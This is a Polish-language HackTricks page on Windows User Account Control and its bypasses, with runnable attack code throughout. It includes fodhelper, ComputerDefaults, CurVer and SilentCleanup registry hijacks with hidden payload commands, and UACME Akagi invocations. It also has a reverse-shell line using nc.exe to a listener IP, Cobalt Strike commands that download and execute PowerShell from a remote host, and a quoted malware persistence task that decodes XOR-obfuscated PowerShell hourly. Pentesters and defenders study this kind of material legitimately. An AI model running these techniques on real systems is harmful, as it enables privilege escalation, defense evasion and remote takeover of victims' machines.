# UAC - Kontrola konta użytkownika

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kontrola konta użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która wyświetla **monit o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogą potencjalnie naruszyć bezpieczeństwo systemu**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta użytkownika, które nie jest administratorem**, chyba że administrator jawnie zezwoli tym aplikacjom/zadaniom na dostęp do systemu na poziomie administratora. Jest to funkcja ułatwiająca pracę, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.<sup>[[2]](#references)</sup>

Więcej informacji o poziomach integralności:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest włączone, użytkownikowi będącemu administratorem przydzielane są 2 tokeny: token standardowego użytkownika, służący do wykonywania zwykłych działań przy średnim poziomie integralności, oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia działanie UAC i opisuje proces logowania, środowisko użytkownika oraz architekturę UAC.<sup>[[2]](#references)</sup> Administratorzy mogą używać zasad zabezpieczeń, aby skonfigurować działanie UAC w swojej organizacji lokalnie (za pomocą secpol.msc) albo skonfigurować je i wdrożyć za pośrednictwem obiektów zasad grupy (GPO) w środowisku domeny Active Directory. Różne ustawienia szczegółowo opisano [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). W UAC można skonfigurować 10 ustawień zasad grupy. Poniższa tabela zawiera dodatkowe informacje:

| Ustawienie zasad grupy                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru                | Ustawienie domyślne                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kontrola konta użytkownika: tryb zatwierdzania przez administratora dla wbudowanego konta Administrator](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
| [Kontrola konta użytkownika: zachowanie monitu o podwyższenie uprawnień dla administratorów w trybie zatwierdzania przez administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Monit o zgodę dla plików binarnych innych niż Windows na bezpiecznym pulpicie) |
| [Kontrola konta użytkownika: zachowanie monitu o podwyższenie uprawnień dla użytkowników standardowych](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Monit o poświadczenia na bezpiecznym pulpicie)         |
| [Kontrola konta użytkownika: wykrywanie instalacji aplikacji i monit o podwyższenie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Włączone; domyślnie wyłączone w wersji Enterprise)           |
| [Kontrola konta użytkownika: podwyższanie uprawnień tylko dla plików wykonywalnych z podpisem i poprawną walidacją](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
| [Kontrola konta użytkownika: podwyższanie uprawnień tylko dla aplikacji UIAccess zainstalowanych w bezpiecznych lokalizacjach](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
| [Kontrola konta użytkownika: uruchamianie wszystkich administratorów w trybie zatwierdzania przez administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
| [Kontrola konta użytkownika: zezwalanie aplikacjom UIAccess na wyświetlanie monitów o podwyższenie uprawnień bez używania bezpiecznego pulpitu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
| [Kontrola konta użytkownika: przełączanie na bezpieczny pulpit podczas wyświetlania monitu o podwyższenie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
| [Kontrola konta użytkownika: wirtualizacja błędów zapisu plików i rejestru w lokalizacjach poszczególnych użytkowników](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |

### Zasady instalowania oprogramowania w systemie Windows

**Lokalne zasady zabezpieczeń** (na większości systemów dostępne w „secpol.msc”) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom bez uprawnień administratora instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik bez uprawnień administratora może pobrać instalator oprogramowania, nie będzie mógł go uruchomić bez konta administratora.

### Klucze rejestru wymuszające monit UAC o podwyższenie uprawnień

Jako użytkownik standardowy bez uprawnień administratora możesz sprawić, by **UAC prosiło o poświadczenia** konta „standardowego” podczas próby wykonania określonych działań. Wymaga to zmodyfikowania określonych **kluczy rejestru**, do czego potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** albo atakujący jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, te zmiany wymuszają **ponowne podanie poświadczeń konta** w celu wykonania działań administracyjnych.

**W praktyce jest to przydatne tylko wtedy, gdy masz już token z podwyższonymi uprawnieniami, UAC bypass albo błędną konfigurację umożliwiającą zmianę tych kluczy; w przeciwnym razie zapis do rejestru zostanie zablokowany.**

Należy zmienić następujące klucze rejestru i wpisy (wartości domyślne podano w nawiasach):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Można to również zrobić ręcznie za pomocą narzędzia Lokalne zasady zabezpieczeń. Po wprowadzeniu zmian system prosi użytkownika o ponowne podanie poświadczeń podczas wykonywania działań administracyjnych.

### Uwaga

**Kontrola konta użytkownika nie jest granicą bezpieczeństwa.** Dlatego użytkownicy standardowi nie mogą wydostać się ze swoich kont i uzyskać uprawnień administratora bez wykorzystania lokalnej luki umożliwiającej eskalację uprawnień.

### Poproś użytkownika o „pełny dostęp do komputera”

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Uprawnienia UAC

- Internet Explorer Protected Mode używa kontroli integralności, aby uniemożliwić procesom o wysokim poziomie integralności (takim jak przeglądarki internetowe) dostęp do danych o niskim poziomie integralności (takich jak folder tymczasowych plików internetowych). Osiąga się to przez uruchomienie przeglądarki z tokenem o niskim poziomie integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskim poziomie integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać uzyskiwaniu przez ataki remote code execution dostępu do poufnych danych w systemie.
- Gdy użytkownik loguje się do systemu Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę poświadczeń użytkownika, używanych do uwierzytelniania go na komputerze i uzyskiwania dostępu do zasobów w sieci.

### Autoadminlogon

Aby skonfigurować automatyczne logowanie określonego użytkownika do systemu Windows podczas uruchamiania, ustaw **klucz rejestru `AutoAdminLogon`**. Jest to przydatne w środowiskach kiosków lub do celów testowych. Używaj tej opcji tylko w bezpiecznych systemach, ponieważ hasło jest wtedy widoczne w rejestrze.

Ustaw następujące klucze za pomocą Edytora rejestru lub polecenia `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Pamiętaj, że jeśli masz dostęp graficzny do komputera ofiary, UAC bypass jest prosty — wystarczy kliknąć „Yes”, gdy pojawi się monit UAC.

UAC bypass jest potrzebny w następującej sytuacji: **UAC jest włączone, Twój proces działa w kontekście o średnim poziomie integralności, a użytkownik należy do grupy administratorów**.

Warto zaznaczyć, że **znacznie trudniej ominąć UAC, gdy jest ustawione na najwyższy poziom zabezpieczeń (Always), niż gdy jest ustawione na dowolny z pozostałych poziomów (Default).**

### Szybka ocena z powłoki o średnim poziomie integralności

Zanim spróbujesz wykonać bypass, potwierdź, że jesteś w odpowiedniej sytuacji, i dopasuj kompilację systemu do znanych, działających metod:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Praktyczne uwagi:
- Jeśli `EnableLUA=0`, nie potrzebujesz bypassu: dowolny token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla auto-elevate / bypassów opartych na COM.
- `Always Notify` podnosi poprzeczkę, ale nadal należy przetestować konkretną kompilację, zamiast zakładać, że próba się nie powiedzie: UACME nadal śledzi niektóre metody zgodne z `AlwaysNotify` w nowoczesnych kompilacjach Windows.<sup>[[3]](#references)</sup>

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` ma wartość **`0`**), możesz **uruchomić reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś w rodzaju:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + ponowne użycie obiektu debugowania

Interfejs AppInfo local RPC `201ef99a-7fa0-444c-9399-19ba84f12a1a` może tworzyć procesy z włączonym debugowaniem. Procesy utworzone w trybie debugowania na tym samym wątku współdzielą obiekt debugowania wątku; zdarzenie debugowania podczas tworzenia procesu zawiera uchwyt do procesu z pełnym dostępem, nawet gdy sam wynik RPC przyznaje jedynie ograniczony dostęp. Dzięki temu ponowne użycie obiektu debugowania staje się prymitywem UAC dla użytkownika o średnim poziomie integralności, należącego do grupy Administrators.<sup>[[11]](#references)[[12]](#references)</sup>

Praktyczny łańcuch działań:<sup>[[11]](#references)[[12]](#references)</sup>

1. Wywołaj metodę local RPC (bezpośrednio lub przez `NdrAsyncClientCall`), aby utworzyć niepodwyższony proces ofiarny z włączonym debugowaniem.
2. Odpytaj `ProcessDebugObjectHandle` za pomocą `NtQueryInformationProcess`, odłącz obiekt przez `NtRemoveProcessDebug`, zachowaj go i zakończ proces ofiarny.
3. Użyj tego samego interfejsu RPC, aby utworzyć zaufany, automatycznie podwyższany proces, a następnie przypisz zachowany obiekt do wywołującego wątku za pomocą `DbgUiSetThreadDebugObject`.
4. Wywołaj `WaitForDebugEvent` i pobierz uchwyt procesu ze zdarzenia `CREATE_PROCESS_DEBUG_EVENT`; przed kontynuowaniem zduplikuj go za pomocą `NtDuplicateObject`.
5. Przekaż zduplikowany uchwyt do `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` i uruchom payload ze strukturą extended startup-info. Pozwala to ponownie użyć kontekstu podwyższonego procesu, a także nadać procesowi potomnemu wiarygodnie wyglądającą relację z procesem nadrzędnym.

Wypatruj krótkiej sekwencji działań, a nie tylko automatycznie podwyższanego pliku binarnego: tworzenia procesu przez local AppInfo RPC, zapytań `ProcessDebugObjectHandle`, odłączania i ponownego podłączania debuggera, natychmiastowego zdarzenia debugowania utworzenia procesu, duplikowania uchwytu oraz procesu potomnego, którego zarejestrowany proces nadrzędny nie zgadza się z procesem, który wywołał API tworzące proces.<sup>[[12]](#references)</sup>

### **Bardzo** podstawowy „bypass” UAC (pełny dostęp do systemu plików)

Jeśli masz shell użytkownika należącego do grupy Administrators, możesz **zamontować udział C$** przez SMB (system plików) lokalnie jako nowy dysk. Uzyskasz wtedy **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ta sztuczka już nie działa**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Ominięcie UAC za pomocą Cobalt Strike

Techniki Cobalt Strike działają tylko wtedy, gdy UAC nie jest ustawiony na maksymalny poziom zabezpieczeń.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** i **Metasploit** mają również kilka modułów do **omijania** mechanizmu **UAC**.

### Podwyższone uprawnieniami interfejsy COM (`ICMLuaUtil` / `CMSTPLUA`)

Automatycznie podwyższane uprawnieniami obiekty COM pozostają praktycznym wektorem ataku na UAC w nowoczesnych wersjach systemu. UACME nadal śledzi `ICMLuaUtil` jako działający w aktualnych gałęziach Windows, a narzędzia ofensywne wciąż dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, 64-bitowe wykonanie i czasami podszywanie się pod PEB/proces przed wywołaniem COM Elevation Moniker.<sup>[[3]](#references)</sup>

Praktyczne wskazówki:
- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
- Jeśli surowa powłoka nie działa, spróbuj ponownie z użyciem implementacji BOF / UACME zamiast naiwnego wrappera `CreateProcess`.
- Uruchomienie procesu potomnego odbywa się w **osobnym procesie z podwyższonymi uprawnieniami**; wiele BOF-ów nie podwyższa uprawnień bieżącego beacona bezpośrednio.

### KRBUACBypass

Dokumentacja i narzędzie: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploity omijające UAC

[**UACME**](https://github.com/hfiref0x/UACME) to zbiór technik omijania UAC. Skompiluj go za pomocą Visual Studio lub MSBuild; kompilacja tworzy kilka plików wykonywalnych (na przykład `Source\Akagi\output\x64\Debug\Akagi.exe`), dlatego wybierz metodę odpowiednią dla docelowej kompilacji systemu.<sup>[[3]](#references)</sup>\
Zachowaj ostrożność: niektóre metody omijania UAC uruchamiają widoczne programy lub monity, które mogą zaalarmować użytkownika.<sup>[[3]](#references)</sup>

UACME podaje **wersję kompilacji, od której dana technika zaczęła działać**.<sup>[[3]](#references)</sup> Możesz wyszukać technikę działającą w Twoich wersjach:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Również na podstawie numerów kompilacji, korzystając z [tej](https://en.wikipedia.org/wiki/Windows_10_version_history) strony, można ustalić wersję Windows `1607`.

Praktyczny workflow polega na tym, aby najpierw **ocenić kompilację hosta**, a dopiero potem uruchomić pasującą metodę:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` szybko porównuje lokalną kompilację ze znanymi metodami UAC, co pozwala szybko odrzucić nieaktualne PoC.<sup>[[4]](#references)</sup>
- `UACME` pozostaje najlepszym publicznym katalogiem do dopasowania obejścia do konkretnej kompilacji. Wersja 3.7.1 dodała metody 83–85, a w poprzednim wydaniu ponownie przetestowano istniejące metody pod kątem **Windows 11 25H2**; sprawdź ponownie tabelę metod i informacje o wydaniu, zamiast zakładać, że stare PoC nadal działa bez zmian.<sup>[[3]](#references)[[9]](#references)</sup>

### Łańcuchy WNF/UIAccess zgodne z Always Notify (UACME 3.7.1)

`Always Notify` nie eliminuje wszystkich obejść UAC. UACME 3.7.1 implementuje trzy nowe metody x64, które łączą kontrolowany przez użytkownika stan środowiska/protokołu z działaniem podwyższonego zadania zaplanowanego lub UIAccess, i oznacza je wszystkie jako `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** przekieruj `SystemRoot`, aby wyzwalana przez WNF ścieżka `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` powodowała, że podwyższony proces `taskhostw.exe` ładuje bocznie `unifiedconsent.dll`. UACME śledzi tę metodę od Windows 10 build 19041.
- **84 — TabTip:** użyj tego samego prymitywu zmiennej środowiskowej wobec UIAccess `TabTip.exe`, który ładuje `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` lub `rsaenh.dll` w zależności od kompilacji, a następnie wykonaj pivot z uzyskanego kontekstu UIAccess o wysokim poziomie integralności. UACME śledzi tę metodę od Windows 8.1 / Server 2016.
- **85 — Narrator:** przejmij protokół `feedback-hub` dla danego użytkownika, steruj Narratorem za pomocą `Alt+CapsLock+F`, a następnie uruchom zapisywalną kopię `osk.exe`, która ładuje bocznie `OskSupport.dll`. Wymaga to interaktywnego pulpitu; UACME śledzi tę metodę od Windows 10 1809 / Server 2019.

Po zbudowaniu jednostek payloadu i Akagi zgodnie z dokumentacją UACME wywołaj odpowiadający numer metody (opcjonalne polecenie domyślnie to `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Metody 84 i 85 zależą od UIAccess/interakcji z pulpitem, więc nie należy oczekiwać, że zadziałają bez zmian z Session 0 lub nieinteraktywnej powłoki usługi. Wszystkie trzy modyfikują stan środowiska/protokołu i umieszczają pliki DLL; przed testowaniem sprawdź implementację, a po testach usuń te artefakty.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany plik binarny `fodhelper.exe` jest automatycznie podnoszony do wyższego poziomu uprawnień we współczesnych wersjach Windows. Po uruchomieniu odpytuje poniższą ścieżkę rejestru użytkownika bez weryfikowania czasownika `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o poziomie Medium Integrity (użytkownik należy do grupy Administrators) uruchomić proces o poziomie High Integrity bez monitu UAC.

Ścieżka rejestru odpytywana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Kroki PowerShell (ustaw payload, a następnie uruchom)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Uwagi:
- Działa, gdy bieżący użytkownik należy do grupy Administrators, a poziom UAC jest domyślny lub łagodny (nie „Always Notify” z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżką do pliku EXE). Aby zachować dyskrecję, unikaj interfejsów użytkownika wyświetlających monity.

#### `ComputerDefaults.exe` jako wyzwalacz tego samego handlera `ms-settings`

`ComputerDefaults.exe` rozwiązuje to samo skojarzenie `ms-settings\Shell\Open\command` dla bieżącego użytkownika co `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Po ustawieniu powyżej domyślnego polecenia i pustej wartości `DelegateExecute` użyj `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` jako alternatywnego wyzwalacza; nie powtarzaj konfiguracji rejestru.<sup>[[13]](#references)[[14]](#references)</sup> Nadal obowiązują wymagania wstępne dotyczące administratora o średnim poziomie integralności oraz zasad UAC opisane powyżej w uwagach dotyczących `fodhelper.exe`.<sup>[[2]](#references)[[3]](#references)</sup> UACME kataloguje ten wyzwalacz od Windows 10 RS4 (build 17134), dlatego sprawdź go na docelowym buildzie.<sup>[[3]](#references)</sup>

#### Wariant hijack przez CurVer/rozszerzenie (tylko HKCU)

Nowsze próbki nadużywające `fodhelper.exe` pomijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości `CurVer` dla bieżącego użytkownika. Automatycznie podwyższany plik binarny nadal rozwiązuje handler w `HKCU`, więc do umieszczenia kluczy nie jest potrzebny token administratora:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Po podniesieniu uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania z zakresu defense evasion (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby działać z wysokim poziomem integralności. Typowe zadanie persistence zapisuje na dysku **zaszyfrowany metodą XOR skrypt PowerShell**, a następnie co godzinę dekoduje go i uruchamia w pamięci:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Ten wariant nadal usuwa dropper i pozostawia tylko staged payloads, przez co wykrywanie opiera się na monitorowaniu **hijacku `CurVer`**, modyfikacji `ConsentPromptBehaviorAdmin`, tworzenia wyjątków w Defenderze lub zadań zaplanowanych, które deszyfrują PowerShell w pamięci.<sup>[[5]](#references)</sup>

### UAC bypass przez zadanie `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie na dowolne polecenie i uzyskać wysoki poziom integralności bez okna dialogowego potwierdzenia.<sup>[[8]](#references)</sup> Warto nadal testować tę metodę na nowszych kompilacjach, ponieważ UACME wciąż utrzymuje tę technikę, a śledzenie ostatnich zgłoszeń wskazuje, że Windows 11 24H2 może wymagać jedynie drobnych zmian w cudzysłowach.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Jeśli zadanie cytuje ścieżkę w tej kompilacji, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Po testach zawsze usuń `HKCU\Environment\windir`.

#### Więcej metod obejścia UAC

Wiele klasycznych metod obejścia UAC, które wykorzystują interfejsy użytkownika, obiekty COM lub interakcję z pulpitem, wymaga **w pełni interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub usługa działająca w **Session 0** często nie wystarczą.

Często można to rozwiązać za pomocą sesji **meterpreter**. Przenieś ją do **procesu**, którego wartość **Session** wynosi **1**:

![Wskaż ms-settings na własne rozszerzenie (.thm) i przypisz to rozszerzenie do naszego payloadu — Więcej metod obejścia UAC: Możesz to zrobić za pomocą sesji meterpreter. Przenieś ją do procesu, którego wartość Session...](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### Obejście UAC przez GUI

Jeśli masz dostęp do **GUI, możesz po prostu zaakceptować monit UAC**, gdy się pojawi; techniczne obejście nie jest wtedy potrzebne. Dlatego uzyskanie sesji GUI często wystarczy, by ominąć utrudnienia, które UAC wprowadza w praktyce.

Co więcej, jeśli uzyskasz sesję GUI używaną przez kogoś (potencjalnie przez RDP), mogą w niej działać **narzędzia uruchomione jako administrator**, z których można bezpośrednio **uruchomić** na przykład **cmd** **jako administrator**, bez ponownego wyświetlania monitu UAC, np. za pomocą [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.

### Głośna metoda brute-force obejścia UAC

Jeśli hałas jest akceptowalny, narzędzie takie jak [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) może wielokrotnie żądać podwyższenia uprawnień, aż użytkownik je zaakceptuje.

### Własne obejście — podstawowa metodyka obchodzenia UAC

Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele metod obejścia UAC wykorzystuje DLL hijacking** (często polegające na tym, że podwyższony binarny plik ładuje kontrolowaną przez atakującego bibliotekę DLL z zapisywalnej ścieżki). [Przeczytaj ten materiał, aby dowiedzieć się, jak znaleźć podatność na DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź binarny plik, który **autoelevate** (sprawdź, czy po uruchomieniu działa z wysokim poziomem integralności).
2. Za pomocą ProcMon znajdź zdarzenia "**NAME NOT FOUND**", które mogą wskazywać na podatność na **DLL Hijacking**.
3. Prawdopodobnie trzeba będzie **zapisać** bibliotekę DLL w jednej z **chronionych ścieżek** (np. C:\Windows\System32), do których nie masz uprawnień zapisu. Możesz to obejść za pomocą:
   1. **wusa.exe**: Windows 7, 8 i 8.1. Pozwala rozpakować zawartość pliku CAB do chronionych ścieżek (ponieważ to narzędzie działa z wysokim poziomem integralności).
   2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, który skopiuje bibliotekę DLL do chronionej ścieżki, a następnie uruchomi podatny, automatycznie podwyższający uprawnienia plik binarny.

### Inna technika obejścia UAC

